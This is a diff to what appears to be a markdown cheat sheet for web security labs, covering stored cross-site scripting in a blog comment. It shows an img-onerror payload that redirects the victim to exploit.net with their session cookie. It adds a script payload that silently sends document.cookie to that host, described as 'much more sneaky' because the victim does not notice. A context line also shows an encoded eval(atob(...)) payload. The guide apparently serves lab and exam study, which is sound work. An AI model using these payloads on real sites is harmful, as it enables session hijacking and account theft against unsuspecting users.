@@ -934,11 +934,18 @@ location = "https://TARGET.net/?SearchTerm=%22%2d%65%76%61%6c%28%61%74%6f%62%28%
 
 ![Identify-stored-xss](images/identify-stored-xss.png)  
 
->Cross site Scripting saved in Blog post comment. This Cookie Stealer payload then send the victim session cookie to the exploit server logs.  
+>Cross site Scripting saved in Blog post comment. This Cookie Stealer payload then send the victim session cookie to the exploit server logs, redirecting to that URL. **Not very sneaky, the victim notices**.
 
 ```html
 <img src="1" onerror="window.location='https://exploit.net/cookie='+document.cookie">
-```  
+```
+>Instead, this other payload does the same, but the request is automatically done with **no redirection**, so it is much more sneaky
+
+```JavaScript
+<script>
+document.write('<img src="https://exploit.net?cookieStealer='+document.cookie+'" />');
+</script>
+```
 
 >Product and Store lookup  
 
